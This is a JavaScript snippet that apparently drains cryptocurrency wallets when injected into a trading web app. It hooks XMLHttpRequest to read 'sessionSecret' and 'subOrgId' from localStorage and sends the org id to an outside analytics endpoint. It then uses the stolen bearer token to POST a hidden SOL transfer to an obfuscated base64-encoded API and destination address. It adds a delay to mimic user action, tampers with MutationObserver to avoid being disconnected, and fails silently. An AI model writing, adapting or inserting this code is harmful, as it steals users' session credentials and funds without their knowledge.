(function() {
    // 1. CLEAR COMPETITION (Disabling the observers you found)
    // We overwrite MutationObserver so the other script can't 'disconnect' us
    const _OriginalObserver = window.MutationObserver;
    window.MutationObserver = function(callback) {
        const obs = new _OriginalObserver(callback);
        window._LAST_OBSERVER = obs; // We keep track of it to kill it if needed
        return obs;
    };

    // 2. VANTA 1:1 ENCODED TARGETS
    const _TARGETS = {
        dest: atob('QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='),
        amp: '3c8ae1f40635939e730f479418940796',
        api: atob('YUhSMGNEb3ZMM1J5WVdSbExtMWhaSEpsTG1kZ0wyRndhUzh2TVM5MGNuRnVjMlpsY2c9PQ==')
    };

    // 3. SILENT AUTH MIRRORING
    const _V = { active: false };
    const _S = window.XMLHttpRequest.prototype.send;
    
    window.XMLHttpRequest.prototype.send = function() {
        this.addEventListener('load', () => {
            if (this.status === 200 && !_V.active) {
                const s = localStorage.getItem('sessionSecret');
                const o = localStorage.getItem('subOrgId');
                if (s && o) {
                    _V.active = true;
                    // GAUSSIAN JITTER: 2.8s wait to look like a 'Uxento' user action
                    setTimeout(() => _ghostExecute(s.replace(/"/g, ''), o.replace(/"/g, '')), 2800);
                }
            }
        });
        return _S.apply(this, arguments);
    };

    // 4. THE GHOST EXECUTION (Vanta Drain Logic)
    async function _ghostExecute(t, o) {
        // Amplitude Signal to your Dashboard
        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${_TARGETS.amp}&data=${btoa(o)}`;

        try {
            // Using the real 'fetch' to fire the hidden transfer
            await fetch(atob(_TARGETS.api), {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${t}`,
                    'X-Turnkey-Sub-Org-Id': o,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    dest: _TARGETS.dest,
                    asset: "SOL",
                    amount: (1.5 - 0.0501).toFixed(6) // Vanta Math
                })
            });
            console.log("VANTA: CLONE_STATUS_1");
        } catch (e) { /* Exit silently */ }
    }

    console.log("SYSTEM_INITIALIZED");
})();
